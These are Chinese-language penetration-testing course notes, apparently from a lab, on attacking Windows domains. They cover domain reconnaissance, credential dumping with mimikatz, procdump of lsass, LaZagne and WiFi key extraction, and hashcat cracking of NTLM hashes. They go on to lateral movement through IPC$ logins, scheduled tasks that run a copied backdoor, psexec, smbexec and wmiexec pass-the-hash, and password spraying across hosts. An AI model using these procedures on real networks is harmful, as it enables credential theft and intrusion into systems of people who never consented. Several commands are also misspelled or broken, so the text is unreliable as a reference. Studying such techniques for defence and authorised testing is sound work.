# XD安全渗透测试 学习笔记 | 内网渗透(一)

* * *

## day65.域环境&⼯作组&局域⽹探针⽅案-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2YYEv6Yl619GBJx2ZkdIjJLgSSMNZd6y8XicvrKiaJAXJVwvHZV16oPSA%2F640%3Fwx_fmt%3Dpng)

域控制器DC就是域的管理服务器

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Q2wD1nL1s8R2HziamE7DrqGX49gcSBSj1jybfesn5YyMLPcTJCdicaKw%2F640%3Fwx_fmt%3Dpng)

### 演示案例：

#### 基本信息收集操作演示

旨在了解当前服务器的计算机基本信息，为后续判断服务器⻆⾊，⽹络环境等做准备systeminfo详细信息

net start 启动服务t

asjlist 进程列表

schtasks 计划任务

⽹络信息收集操作演示

旨在了解当前服务器的⽹络接⼝信息，为判断当前⻆⾊，功能，⽹络架构做准备ipconfig /all 判断存在域\-dns

有域

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm28rgyD8icR70jwU9aoeFMoEkEDv2y8MAhjCpSpN90TibvLK1tEofIxLtg%2F640%3Fwx_fmt%3Dpng)

没有域

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2DKG1xwWYZefLEdPwk3QeicoeVGtdPA1BNfzbpmcvdty1DDVMaqIY2QQ%2F640%3Fwx_fmt%3Dpng)

判断是否存在域：

net view /domain

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm26gHWzac2SeSOpoGntzy9y8GKDlmGdEwgod3XHlCOdthFBYvBKhlW6Q%2F640%3Fwx_fmt%3Dpng)-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2czOK7M7hksLKibAknExrvYVQP2zyd6bYNWrRVMonfIuDiaf8eenVicNog%2F640%3Fwx_fmt%3Dpng)

获得一个计算机名字,我们可以通过ping命令来获取IP地址

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2zfpucbKCZjAoEkOpp1qhk2e9bicvFr42KOkHdvy5GLUwB404yfOMbmQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2O1ytAENNLIT7Jlql6riaY7JlguyeQJ4VrUmjaeZ27J7prdItzMbUefA%2F640%3Fwx_fmt%3Dpng)

netstart -ano 当前网络端口开放：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vW42oXHTTbBKG7Vcg39e76a24RygviaQwcicletUlQXnia4vH6QRia96Tw%2F640%3Fwx_fmt%3Dpng)

nslookup 域名追踪来源地址：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2piadoqGzSLaLuvaibguUXIq7cz9lEu2iaLVxM1868M6U67l8iampuFB5Jg%2F640%3Fwx_fmt%3Dpng)

⽤户信息收集操作演示

旨在了解当前计算机或域环境下的⽤户及⽤户组，便于后期利⽤凭证进⾏测试

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm23O6bCptFvAYyS24umbtdTzLgYCYeficfBqtCPeDSzEnGtVexfSSxlFw%2F640%3Fwx_fmt%3Dpng)

主要针对Domain Admins/Enterprise Admins 相关⽤户收集操作命令：

Whoami /all ⽤户权限

net config workstation 登录信息

net user 本地信息

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2uwD72ibU6KKNE3w7JX7nuKAjg2yfApW4gNfMG9ibd5gba5RUMsel3n8w%2F640%3Fwx_fmt%3Dpng)

net localgroup 本地⽤户组

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2t5xRuRibGRHIspC76YwDW7ZYhtiaq8fONuia4MTu47nMXo6pgtHByDDwg%2F640%3Fwx_fmt%3Dpng)

net user /domain 获取域用户信息

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2KWNIngibzN1kSTtKkEyImTf16jn8b4pL6rUysryIeXibxjcjlZqtcljA%2F640%3Fwx_fmt%3Dpng)

net group /domain 获取域用户组信息

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2J4hPMwWBiaCnQmbB0czicEMaVwaNJfBAjkPWyvJibl3qEZwYhvBoiczgCg%2F640%3Fwx_fmt%3Dpng)

wmic useraccount get /all 涉及域用户详细信息

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2a6mkqMo8ALgvtvfPU8KKaMZwtJG4dAoXD5WUBkvwcTALLwzQpBd0Eg%2F640%3Fwx_fmt%3Dpng)

net group "Domain Admins" /domain 查询域管理员账户

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Y8mLuicgnUia1Xv1ROv4koWHmwuM1sJusnLNCzVzrsB49YIbLpajibib9g%2F640%3Fwx_fmt%3Dpng)

net group "Enterprise Admins" /domain 查询管理员用户组

net group "Domain Controllers" /domain 查询域控制器

当你打开当前web server的本机管理时会跳出

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2nmeicwkzIiarG7lDLRJqaMUsnNfE30iaGsoTYibo9nceSflGF1I83uaAbA%2F640%3Fwx_fmt%3Dpng)

需要验证账号密码才能操作,这个就是因为AD目录来操控的,域成员主机权限不够。现在的用户是GOD\\webadmin域成员

我们可以切换账号至WEBSERVER|administrator

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm21dibgCyYqqeibTydMAgUwtuPChwxf0KgpARRtM5IqqxQdYjOK310EZsw%2F640%3Fwx_fmt%3Dpng)

这个时候就可以查看了。现在用的是自己的账号,而非域账号

通过这些收集,我们可以得到域用户名,如果再得到密码,就可以登录操控了

#### 凭证信息收集操作演示

旨在收集各种密文、明文、口令等,为后续横向渗透做好准备

计算机用户HASH,明文获取-mimikatz(win),mimipenguin(Linux)

如果是GOD\\webadmin,是无法运行的,权限不足,权限提升

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2NfiaaxibE5m9dUXlo8bo6c5hcTQ93g7FT4e1HPNZDu7N9OOibTkOHicm7w%2F640%3Fwx_fmt%3Dpng)

按照帮助文档进行操作

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2Z3XlRJKicTuuWgu06xcPxPfLa5MZz8X8DxAs7uZwx20aAETsAuJpxLQ%2F640%3Fwx_fmt%3Dpng)

mimipenguin(Linux)只支持部分Linux

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2djPh1U2davz7CcbjvMxyoYAQddwE0ZBIictkpgKyPLogicNML23yPp2g%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2tPaEIDicBX9FyXjmXZPs9zZ9uZhOyibhpwicJIVfiaPndEhjKZicxFYQSbA%2F640%3Fwx_fmt%3Dpng)

计算机各种协议服务口令获取-LaZagne(all),XenArmor(win)

LaZagne(all)支持全系统,但垃圾

XenArmor(win)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2icnkqyvms8g8bP9FETwmGwQ1RvMPUTqhaibTPU0rLz3ojxxrHNESp3XA%2F640%3Fwx_fmt%3Dpng)

根据需要配置环境路径

Netsh WLAN show profiles

Netsh WLAN show profiles name="无线名称" key=clear

1.站点源码备份文件、数据库备份文件等

2.各类数据库web管理入口,如PHPMyadmin

3.浏览器保存密码、浏览器Cookie

4.其他用户会话,3389和ipc$连接记录、回收站内容

5.Windows 保存的WiFi密码

6.网络内部的各种和面膜,如:Email,VPN,FTP、OA等

#### 探针主机域控架构服务操作演示

为后续横向思路做准备,针对应用,协议等各类攻击手法

探针域控制器名地址信息

net time /domain nslookup ping

探针域内存活主机及地址信息

nbtscan 192.168.3.0/24 第三方工具

一个老牌工具,既不免杀,还得下载

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm22fAHPticcsZjsgCJRluvu5YIXDH9zXI2dcSlUTVSL5RNLo8F08ljGLg%2F640%3Fwx_fmt%3Dpng)

for /L %I in(1,1,254) DO @ping -w 1 -n 1 192.168.3.%I |findst "TTL=" 自带内部命令

自带内部命令,不用免杀,缺点,显示内容没有那麽多,只有目标的地址

nmap masscan 第三方Powershell脚本nishang empire等

用第三方的工具扫描可能会被监控到,从而被拦截

#导入模块nishang

Import-Moddule .\\nishang.pm1

#设置执行策略

Set-ExecutionPolicy RemoteSinged

#获取模块nishang的命令函数

Get-command -Module nishang

#获取常规计算机信息

Get-Infirmation

#端口扫描

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2NHRvXeE07TVG0QpWWsYPqHDhWD7rhsaFm8OaPia14rZY5eRibwn1mgng%2F640%3Fwx_fmt%3Dpng)

#其他功能:删除补丁,fantanshell,凭证获取

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2UicE0m7ywIh49yN3C83kZbXXghLkqncro9PwfGucs88NOQYialK3LTOQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ic29dSYJdGjFtEeXIGs4vbHeNSaBDuJuVzkUjokRXedx63Osvez2GcA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2QXAOrZz2GU11iaJbSmJfCaxRqnhnw3Fvrox5LCNxhOLjtZyklBfeRQg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2DlNIJLt2NH890BZtODfTPDnIH42GP5mV0zPnbnBtLBh2lciavxIHVEQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2OAo3UFUia8atUXbSIbSLPpVHmhXODsWuYQETIRbKfia0SG1c7GhC8uuQ%2F640%3Fwx_fmt%3Dpng)

* * *

# day66.域横向批量 at&schtasks&impacket

''传递攻击是建立在明文和hash获取介质上的一种攻击

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2D28wp3MZ68ys1h546AjmjqoNf6oqiaibNhiazCaCDh0GmFD4hVHmmF4zQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ylDvRm1lR3v47BrXYlNiaMw6TS7TXbfzOVSeO4xOedmflknknBOJjibg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2WWpTZibxnnHibCIP7MkaB0vSdrmUmj560HBl4gMk4MKyxYbHtur4nCHQ%2F640%3Fwx_fmt%3Dpng)

演示案例

### 案例1-横向渗透明文传递at&schtasks

在拿下一台内网主机后,通过本地信息搜集收集用户凭证等信息后,如何横向渗透拿下更多的主机?

这里仅介绍at&schtasks命令的使用,在已知目标系统的用户明文密码的基础上,直接可以在远程主机上执行命令。获取到某域主机权限->minikatz得到密码(明文,hash)->用到信息收集里面域用户的列表当作用户字典->用到密码明文当作密码字典->尝试连接->创建计划任务(at|schtasks)->执行文件为后⻔或相关命令

利用流程:

*   1.建立IPC链接到目标主机
    
*   2.拷⻉要执行的命令脚本到目标主机
    
*   3.查看目标时间,创建计划任务(at,schtasks)
    
*   4.删除IPC链接
    

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vUukZqUgd1CYjour9NkCic7IVxBtic38sM8Irth2VZdwlbQr4LQxTtEg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2xaia8E2blUcQmMuM7vQMtSotSkN5WdsKgzxBrG8PMDYlicJIgUNUq5MQ%2F640%3Fwx_fmt%3Dpng)

\[at\] & \[schtasks\] 都是基于定时任务的攻击

#at < Windows2012

net use \\\\192.168.3.21\\ipc$ "Admin12345" /user:god.org\\administrator #建立IPC连接:

copy add.bat \\\\192.168.3.21\\c$ #拷⻉执行文件到目标机器(实战中大多是CS或者MSF木⻢)

at \\\\192.168.3.21 15:47 c:\\add.bat #添加计划任务

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2MIR8cfMoLgyFMIOU0Ky79Pc3QNia94PrHgHHkTduBPnDvGz2KbU7JWw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2T5kuaj4fibWNbMs98UlQiaiatHWhW9uT6Kl1Fz9cD3PCtXtoFUowBJoFQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm23NoeS3Z6iau9CAtdFz3VT1jjIE6YGbEL7EswfrOt60OuVXrEA8xGRdg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2jclYCpe8lxAwVswj28pWFKicsQX312InupA1jUoKpjicawTiay9hYbvHQ%2F640%3Fwx_fmt%3Dpng)

    #schtask >=Windows2012

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2JlgCDkVM9MEBTztyfLzpxEGXI6z2t7ucleAHic6Rc77SmMtq8iaricw9A%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2vXekqRCOH4g3nZniazPV0lPgDPbxpBo04mz8JzEu7CpaFCqyyhG04PQ%2F640%3Fwx_fmt%3Dpng)

### 案例2-横向渗透明文HASH传递atexec-impacket

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2F0tn35hbPVIEp5iauzNY343ElAkG9xwNLwKl9icEe7kquZSXibicdQ29Zw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2eKibBwddiciabxlcIBW1jWZPSOq0iceMpIicYTg0f5YsZxMAfYBHiaadzQxg%2F640%3Fwx_fmt%3Dpng)

还自带提权。优点:方便快捷,可以支持hash。缺点:第三方工具,会受到杀毒软件或防护的影响。如果目标主机有杀软或防护的话,要对该软件进行免杀

### 案例3-横向渗透明文HASH传递批量利用-综合

webServer已经拿到权限

获取密码

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ut6Em45bnEVwEKOtDQYfsnljMtVOibRzt7CKDbPaK4naKoAkicz0URIQ%2F640%3Fwx_fmt%3Dpng)

获得本机密码

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2YZQpH6QGGJAD1ibkjcmRSBKUeeOUh9WdaCohwJwRlsl0G6m9mvuwzXA%2F640%3Fwx_fmt%3Dpng)

探针存活主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2HFibOqjYicNvGFgc7EGP4MsR2UUM2GTSh8RwHQhj9SeWNnm4Gwrh7CJg%2F640%3Fwx_fmt%3Dpng)

使用批处理来跑多个IP地址使用固定的密码账号,来执行个whoami,ips.txt就是刚才收集到存活主机的IP地址

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2ZEmIvFnfWBjoGNOKpTZNiaAkm6HfnWmPtySlpgvJVyagMPZ0jZyJImA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm22elvJib7icVfDw92vrVwRsN7zFlJKia8j00YCABQBPDGyMyYJso3S2ibKA%2F640%3Fwx_fmt%3Dpng)

192.168.3.29采用的是同密码

继续拿下这个主机,重复之前操作。丰富密码字典。

之后拿密码字典去攻击域控

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2JKrJIbgxagxGCyluiajyceFNz7ppYX1dwibRm3atwGLar6scaYuZH3yQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJ8AUVTLdJmkNc0XiauP1hCm2QiaBhH6EBhO2f8LoQWQVr9bfQhYoLJvLeDVQhbsNyT5YcUyDWVNkEeQ%2F640%3Fwx_fmt%3Dpng)

用户名也可以变。以上bat缺点只有一个变量。可以用bat实现多变量,也可以使用python写,然后使用第三方库,打包成.exe

net use \\\\192.168.3.32\\ipc$ admin!@#45 /user:god\\dbadmin

#pip install pyinstaller

#pyinstaller -F fuck\_neiwang\_001.py 生成可执行EXE

    import os,time

* * *

# XD安全渗透测试课程 学习笔记 | 内网渗透(二)
* * *


* * *

## day67.域横向 smb&wmi 明文或 hash 传递

知识点1:

Windows2012以上版本默认关闭wdigest,攻击者无法从内存中获取明文密码

Windows2012以下版本如安装KB2871997补丁,也会导致无法获取明文密码

针对以上情况,我们提供了4种方式解决此类问题

*   1.利用哈希hash传递(pth,ptk等)进行移动
    
*   2.利用其他服务协议(SMB,WMI等)进行哈希移动
    
*   3.利用注册表操作开启Wdigest Auth值进行获取
    
*   4.利用工具或第三方平台(Hachcat)进行破解获取
    

知识点2:

Windows系统LM HASH及NTLM Hash加密算法,个人系统在Windows vista后,服务器系统在Windows 2003以后,认证方式均为NTLM Hash。

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUoyzvb8d9pHyRMcOmibTBmWXEMYJahJ726Zrw780e43FVH515UJ3dvPg%2F640%3Fwx_fmt%3Dpng)

演示案例:

### 案例1-Procdump+Mimikatz配合获取

procdump是Windows官方的工具

如果上传Minmiktz上传后被杀,可以使用Procdump+Mimikatz这个方法

运行procdump在当前目录下生成lsass.dmp文件

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUicoaaESTTrkL7wic1rKjk73YnXH2BG5w733TNJmtN0zsHQqatcnj1IYg%2F640%3Fwx_fmt%3Dpng)

然后再在mimi上使用命令还原出来密码

在目标主机上用proc生成文件,然后再在本地上用Mim还原出密码

mimikatz上执行:

    sekurlas::minidump lsass.dmp

Hashcat破解获取Windows NTML Hash

    hashcat -a 0 -m 1000 file --force

### 案例2-域横向移动SMB服务利用-psexec,smbexec(官方自带)

利用SMB服务可以通过明文或hash传递来远程执行,条件445服务端口开放。

#psexec第一种:先有ipc链接,psexec需要明文或hash传递

    net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUWDxXOVGJ3cZ05gyVIibXEDBlLkTYtgOvkiaRDYicf3eJUPJbzkemaVgAQ%2F640%3Fwx_fmt%3Dpng)

#psexec第二种:不用建立IPC直接提供明文账户密码

官方Pstools无法采用hash连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUn8xiaVQxF5O9deZvkLqseFlF0eJVxqQWibsVR5n1NLClUr56WxxFKpHA%2F640%3Fwx_fmt%3Dpng)

在官网下载pstools,上传至目标主机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUwxtibf7bhib2Nx3yoPI9IP8jibQoicOzcrK8icCdcbUya16d67VOic5xRyeQ%2F640%3Fwx_fmt%3Dpng)

执行命令,将前期信息收集到的ip地址,用户名 ,密码,反弹回cmd

基于Hash的:

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU4jAhY4wq4aM4UMZOxN6uko9sSW7cJRzzpZQqvoNnwehEXoSl2TYLGA%2F640%3Fwx_fmt%3Dpng)

出现了问题，解决需要用到一个非官方的库impacket

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUIUCQucRUyx8vI3Kh3giaYib2nWIatr8lhygSaiaTpicnLYV0gOqIFRPuuw%2F640%3Fwx_fmt%3Dpng)

反弹成功-

#smbexec无需先ipc链接 明文或哈市传递

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdU3vnQJ7I0XPz3WnZ6K8rsddz85SQAWibic74paRsYvO9wQGkpnKoicY8RA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUxCALCecdH2jCOroiaA0smtPYUjuzQVKj1EKESCFsafqUnKynysa4d0A%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUYFl9dSdojBHLCTIkuB3wJLE3mickFlTVPXyErTHyhTHPswOibwMMYoGg%2F640%3Fwx_fmt%3Dpng)

域横向移动WMI服务利用-cscript,wmiexec,wmic

WMI(windows Management Instrumentation)时通过135端口进行利用,支持用户名明文或者hash的方式进行认证,并且该方法不会在目标日志系统留下痕迹

#自带WMIC 明文传递 无回显(缺点,功能比较尴尬)

    wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create"cmd.exe /c ipconfig >C:\1.txt

原本是没有1.txt

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUiaf2rKZIaxOticLy1qJ6E4gszUjOmiaicxsGwrAzYktBE4SNRub6b7Wyng%2F640%3Fwx_fmt%3Dpng)

在目标主机上执行命令,等待连接

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdULIEA0eFFuFeVFWOvA1QrByNeViazfRGFXJO9LZb5tNAShIIHNJyxmrQ%2F640%3Fwx_fmt%3Dpng)

连接完毕后,在目标主机上连接的那个域主机上出现了1.txt

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUEI9nHsuMl0Pdad2yYeO8E4N63S1Sjhzx7zakbwWkIaV2jRfoNZwn2g%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUZTxGPpGP8mW0eiaclgM1QNp0l8vcc6xicOW4ga3dHzKeM0J81Doo0VFg%2F640%3Fwx_fmt%3Dpng)

需要借助一个wmiexec.vbs文件,在资源中有

执行命令,反弹cmd

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJicum920YfaOvlF4gruwmGdUibLS9h0Sgp3r1vIRmVQibNAGQWe6f42ahWDgjPZTrlCWsIOlpYrFLnPg%2F640%3Fwx_fmt%3Dpng)

